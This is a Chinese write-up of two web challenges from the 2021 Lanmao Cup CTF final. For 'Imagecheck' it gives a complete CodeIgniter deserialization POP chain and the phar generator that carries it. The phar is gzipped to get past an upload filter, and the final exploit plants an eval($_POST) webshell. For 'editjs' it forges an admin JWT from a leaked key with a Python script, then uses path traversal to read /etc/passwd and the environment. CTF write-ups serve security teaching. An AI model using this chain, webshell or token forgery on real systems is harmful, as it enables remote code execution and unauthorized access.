> 原文链接: https://www.anquanke.com//post/id/251516 


# 2021蓝帽杯决赛Web  wp


                                阅读量   
                                **26743**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t013730579b335effcd.jpg)](https://p1.ssl.qhimg.com/t013730579b335effcd.jpg)



## Imagecheck

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t012085a3313c224126.png)

题目给了源码，本地搭建一下。

框架是CodeIgniter。需要开几个php拓展，用phpstudy直接开就行。网站-&gt;管理-&gt;php拓展 redis和intl。

拿到源码先看路由

[![](https://p3.ssl.qhimg.com/t01dc5b275b4c1d6c30.png)](https://p3.ssl.qhimg.com/t01dc5b275b4c1d6c30.png)

首先看到的是Upload路由，它接收了一个文件，file_get_contents读出了这个文件，并过滤。所以文件内容不能含有`HALT_COMPILER`需要bypass。第二个过滤告诉我们白名单是什么。

这里其实很容易想到`phar`反序列化。

再来看一下`Check`路由

[![](https://p1.ssl.qhimg.com/t014fddffdcc8effbda.png)](https://p1.ssl.qhimg.com/t014fddffdcc8effbda.png)

发现使用了`getimagesize`且参数可控。`getimagesize`函数是可以触发反序列化的。

因此我们开始着手挖掘pop链。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a7c46df853c5c2a1.png)

搜索`__destruct`发现这里的redis可控，可以触发任意类的close。

于是我们全局搜索close

[![](https://p3.ssl.qhimg.com/t0171d11825901f542f.png)](https://p3.ssl.qhimg.com/t0171d11825901f542f.png)

发现了这个close。当`$this-&gt;redis`存在时，try内的东西抛出错误的时候，就会进入catch方法。

这里的`$this-&gt;redis`就需要用到我们的php拓展 redis中的类了。

[![](https://p3.ssl.qhimg.com/t01165671723b6b6235.png)](https://p3.ssl.qhimg.com/t01165671723b6b6235.png)

关于这里，logger是可控的，于是可以调用任意类的`error`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018d3d46db9ca46fda.png)

找到了这个类，调用了log

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t014c57593e1e511cc9.png)

看下这个log方法。

[![](https://p5.ssl.qhimg.com/t0129496040758648dd.png)](https://p5.ssl.qhimg.com/t0129496040758648dd.png)

重点在这里。这些`handlerConfig`都是可控的，因此`$className`和`$config`也都是可控的所以说`$this-&gt;handlers[$className]`就可控，进一步，`$handler`也是可控的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01cde1c6ae4bdcc251.png)

查询一下发现只有一个地方调用了`setDateFormat`

它会给`handler`类的`dateFormat`属性赋值。可以赋任意值。

然后就是调用了`handler`类的`handle`方法。

找到`FileHandler`类中的`handle`方法

[![](https://p5.ssl.qhimg.com/t0156c6a1e8407f0a4b.png)](https://p5.ssl.qhimg.com/t0156c6a1e8407f0a4b.png)

仔细观察发现可以写文件

[![](https://p5.ssl.qhimg.com/t01d268e27b445c667d.png)](https://p5.ssl.qhimg.com/t01d268e27b445c667d.png)

尝试构造。

先自己写一个类

```
&lt;?php

namespace App\Controllers;

class User extends BaseController
`{`
    public function index()
    `{`
        return unserialize($_GET['ser']);;
    `}`
`}`
```

然后开始构造EXP：

```
&lt;?php

namespace CodeIgniter\Session\Handlers`{`

    class RedisHandler`{`
        protected $redis;
        protected $logger;

        public function __construct($logger,$redis)
        `{`
            $this-&gt;logger=$logger;
            $this-&gt;redis = $redis;
        `}`
    `}`
`}`

namespace CodeIgniter\Cache\Handlers`{`
    class RedisHandler`{`
        protected $redis;
        public function __construct($redis)
        `{`
            $this-&gt;redis=$redis;
        `}`
    `}`
`}`

namespace CodeIgniter\Log`{`
    class Logger`{`
    `}`
`}`

namespace `{`
    $c=new CodeIgniter\Log\Logger();
    $b=new CodeIgniter\Session\Handlers\RedisHandler($c,new redis());
    $a=new CodeIgniter\Cache\Handlers\RedisHandler($b);
    echo urlencode(serialize($a));
`}`
```

首先第一步，构造前几个类。前几个类还是比较容易构造的。

来仔细研究一下Logger类的参数该如何构造。

**为了防止出错**我们先把所有的参数复制过来，然后再修改。

```
protected $logLevels = [
            'emergency' =&gt; 1,
            'alert'     =&gt; 2,
            'critical'  =&gt; 3,
            'error'     =&gt; 4,
            'warning'   =&gt; 5,
            'notice'    =&gt; 6,
            'info'      =&gt; 7,
            'debug'     =&gt; 8,
        ];
        protected $loggableLevels = [];
        protected $filePermissions = 0644;
        protected $dateFormat = 'Y-m-d H:i:s';
        protected $fileExt;
        protected $handlers = [];
        protected $handlerConfig = [];
        public $logCache;
        protected $cacheLogs = false;
```

首先需要修改的就是`$handlerConfig`因为它影响了我们的`$handler`赋值

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014185726845ee83ef.png)

键名为类名，值为类的实际参数，我们看一下我们要用的`FileHandler`类有哪些参数。然后把这些参数填入`$config`

现在是这样子的

```
protected $logLevels = [
            'emergency' =&gt; 1,
            'alert'     =&gt; 2,
            'critical'  =&gt; 3,
            'error'     =&gt; 4,
            'warning'   =&gt; 5,
            'notice'    =&gt; 6,
            'info'      =&gt; 7,
            'debug'     =&gt; 8,
        ];
        protected $loggableLevels = [];
        protected $filePermissions = 0644;
        protected $dateFormat = 'Y-m-d H:i:s';
        protected $fileExt;
        protected $handlers = [];
        protected $handlerConfig = [
            'CodeIgniter\Log\Handlers\FileHandler'=&gt;[
            "path"=&gt;"aa",
            "fileExtension"=&gt;"php",
            "filePermissions"=&gt;"aa"
        ]];
        public $logCache;
        protected $cacheLogs = false;
```

然后尝试反序列化，调试。

打进去单步调试，前几步没有太大问题

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014531a340a4311fb5.png)

[![](https://p0.ssl.qhimg.com/t0198fc0fcc3078137b.png)](https://p0.ssl.qhimg.com/t0198fc0fcc3078137b.png)

到log这里就出现问题了，我们看下问题出现在哪里。

[![](https://p4.ssl.qhimg.com/t01a93ab3df4787ad98.png)](https://p4.ssl.qhimg.com/t01a93ab3df4787ad98.png)

经过调试发现，这个地方返回了`true`也就是说会直接出去。因此我们想办法让他过这个地方

`in_array`是检查数组中师傅含有该值，此时`$level`的值为

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f52b9b44a54e583f.png)

因此我们给`$this-&gt;loggableLevels`赋值。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012435a933d6a09bf3.png)

把可用的都加上。

[![](https://p0.ssl.qhimg.com/t018ac52c114c195355.png)](https://p0.ssl.qhimg.com/t018ac52c114c195355.png)

经过调试发现这里会直接进入continue，不会进入下面。想办法改一下。

进入`BaseHandler`查看

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0117f7ff89aab2fe40.png)

[![](https://p1.ssl.qhimg.com/t0102a13dca4bea0d5e.png)](https://p1.ssl.qhimg.com/t0102a13dca4bea0d5e.png)

只要让它返回true就好了。

[![](https://p1.ssl.qhimg.com/t010376dd37eb887fd0.png)](https://p1.ssl.qhimg.com/t010376dd37eb887fd0.png)

此时level为error，只要给handlers赋值就可以了。

那我们继续赋值

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01cfbe51f738506cc1.png)

这样，就可以过这个地方了。

[![](https://p1.ssl.qhimg.com/t0108c032563152dce1.png)](https://p1.ssl.qhimg.com/t0108c032563152dce1.png)

进入handle方法，且参数都是我们控制的。

[![](https://p2.ssl.qhimg.com/t0177159fd0a0f26d4f.png)](https://p2.ssl.qhimg.com/t0177159fd0a0f26d4f.png)

但是这里有个waf，当后缀是php的时候，那么就会产生一个”死亡exit”

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01238d0cf3262b34db.png)

这里的`$date`会被写入，也就是`dateFormat`它也是我们可控的。

因此第一次我们写入的东西就是这样子的

[![](https://p3.ssl.qhimg.com/t01b56a8cef64cb2e69.png)](https://p3.ssl.qhimg.com/t01b56a8cef64cb2e69.png)

这里加入了死亡exit，`dateFormat`的东西被写进来了。

因此再次更改exp。

如果直接写php的话，h会被date解析成小时，会变成这样，于是就需要转义符

[![](https://p4.ssl.qhimg.com/t014ab4e171f3b96449.png)](https://p4.ssl.qhimg.com/t014ab4e171f3b96449.png)

```
protected $handlerConfig = [
            'CodeIgniter\Log\Handlers\FileHandler'=&gt;[
                'handles' =&gt; ['critical', 'alert', 'emergency', 'debug', 'error', 'info', 'notice', 'warning'],
                "path"=&gt;"uploads/",
                "fileExtension"=&gt;"a.php",
                "filePermissions"=&gt;"aa"
        ]];
```

绕过死亡exit让后缀不为php就行，我们让他成为a.php

[![](https://p4.ssl.qhimg.com/t01926c4036c09182fd.png)](https://p4.ssl.qhimg.com/t01926c4036c09182fd.png)

ok成功写入。

[![](https://p4.ssl.qhimg.com/t0151d8840d8d64fcb1.png)](https://p4.ssl.qhimg.com/t0151d8840d8d64fcb1.png)

链子已打通，尝试构造phar。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0112549f3457f1ebf7.png)

把php.ini的readonly关闭

生成phar上传

[![](https://p3.ssl.qhimg.com/t018377b0f8ee521058.png)](https://p3.ssl.qhimg.com/t018377b0f8ee521058.png)

不出所料，被过滤了，原因是phar中含有`HALT_COMPILER`那么 如何绕过？

我们把这个phar拿去gzip一下

`gzip phar.jpg`

[![](https://p3.ssl.qhimg.com/t013da8bdfca200c88f.png)](https://p3.ssl.qhimg.com/t013da8bdfca200c88f.png)

就可以绕过检测。

```
index.php/Check?file=phar://uploads/phar.jpg/test.txt
```

触发

[![](https://p4.ssl.qhimg.com/t018c90bf643e8a36ed.png)](https://p4.ssl.qhimg.com/t018c90bf643e8a36ed.png)

发现这里写子目录好像不太行，给他改成绝对路径，因为本地测试和phar进入还是有点不一样的

[![](https://p3.ssl.qhimg.com/t0103e07ee61ea3bf92.png)](https://p3.ssl.qhimg.com/t0103e07ee61ea3bf92.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016a6bfdea03ae42fa.png)

最终exp

```
&lt;?php

namespace CodeIgniter\Session\Handlers`{`

    class RedisHandler`{`
        protected $redis;
        protected $logger;

        public function __construct($logger,$redis)
        `{`
            $this-&gt;logger=$logger;
            $this-&gt;redis = $redis;
        `}`
    `}`
`}`

namespace CodeIgniter\Cache\Handlers`{`
    class RedisHandler`{`
        protected $redis;
        public function __construct($redis)
        `{`
            $this-&gt;redis=$redis;
        `}`
    `}`
`}`

namespace CodeIgniter\Log`{`
    class Logger`{`
        protected $logLevels = [
            'emergency' =&gt; 1,
            'alert'     =&gt; 2,
            'critical'  =&gt; 3,
            'error'     =&gt; 4,
            'warning'   =&gt; 5,
            'notice'    =&gt; 6,
            'info'      =&gt; 7,
            'debug'     =&gt; 8,
        ];
        protected $loggableLevels = ['critical', 'alert', 'emergency', 'debug', 'error', 'info', 'notice', 'warning'];
        protected $filePermissions = 0644;
        protected $dateFormat = '&lt;?p\\hp \\e\\v\\a\\l($_\\P\\O\\S\\T["\\a"]);?&gt;Y-m-d H:i:s';
        protected $fileExt;
        protected $handlers = [];
        protected $handlerConfig = [
            'CodeIgniter\Log\Handlers\FileHandler'=&gt;[
                'handles' =&gt; ['critical', 'alert', 'emergency', 'debug', 'error', 'info', 'notice', 'warning'],
                "path"=&gt;"C:\Users\Yang_99\Desktop\bluehat\ImageCheck_cada3f80864345f87ae335e4888826eb\public\uploads",
                "fileExtension"=&gt;"bbb.php",
                "filePermissions"=&gt;"aa"
        ]];
        public $logCache;
        protected $cacheLogs = false;
    `}`
`}`

namespace `{`
    $c=new CodeIgniter\Log\Logger();
    $b=new CodeIgniter\Session\Handlers\RedisHandler($c,new redis());
    $a=new CodeIgniter\Cache\Handlers\RedisHandler($b);
    echo urlencode(serialize($a));
    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar-&gt;startBuffering();
    $phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub
    $phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest
    $phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
    $phar-&gt;stopBuffering();

`}`
```



## editjs

这道题打开根据提示发现了JWT token

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e785285055706968.png)

```
http://eci-2ze44hd5fno9nykys6w3.cloudeci1.ichunqiu.com:8888/getfile?filename=/env/secret.key
```

发现token

```
K3yy
```

使用jwt token进行伪造

脚本

```
import jwt
import time

# payload
token_dict = `{`
  "data": "admin",
  "iat": int(time.time()),
  # "iat": 1629784832 ,
  "exp": int(time.time())+1800
  # "exp": 1629786632
`}`

# headers
headers = `{`
  "alg": "HS256",
  "typ": "JWT"
`}`
print()
jwt_token = jwt.encode(token_dict,  # payload, 有效载体
                     key='K3yy',
                       headers=headers,  # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                        algorithm="HS256",  # 指明签名算法方式, 默认也是HS256
                       )
print(jwt_token)
```

如果没有库可以按照Pyjwt

得到token就可以读文件了

[![](https://p3.ssl.qhimg.com/t01806f6cf954956dd6.png)](https://p3.ssl.qhimg.com/t01806f6cf954956dd6.png)

这样可以读取到源码。根据源码进行审计

[![](https://p3.ssl.qhimg.com/t01ed7f6ff8eb0fe791.png)](https://p3.ssl.qhimg.com/t01ed7f6ff8eb0fe791.png)

发现这里使用了拼接。尝试目录穿越读取

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01541c2ba9f92ffd74.png)

发现可以读到/etc/passwd

注释里说flag在环境变量，于是读一下环境变量，就出了

[![](https://p4.ssl.qhimg.com/t01a835be7d6d01cae0.png)](https://p4.ssl.qhimg.com/t01a835be7d6d01cae0.png)

应该是非预期了，预期解是GKCTF2021-easynode的原题
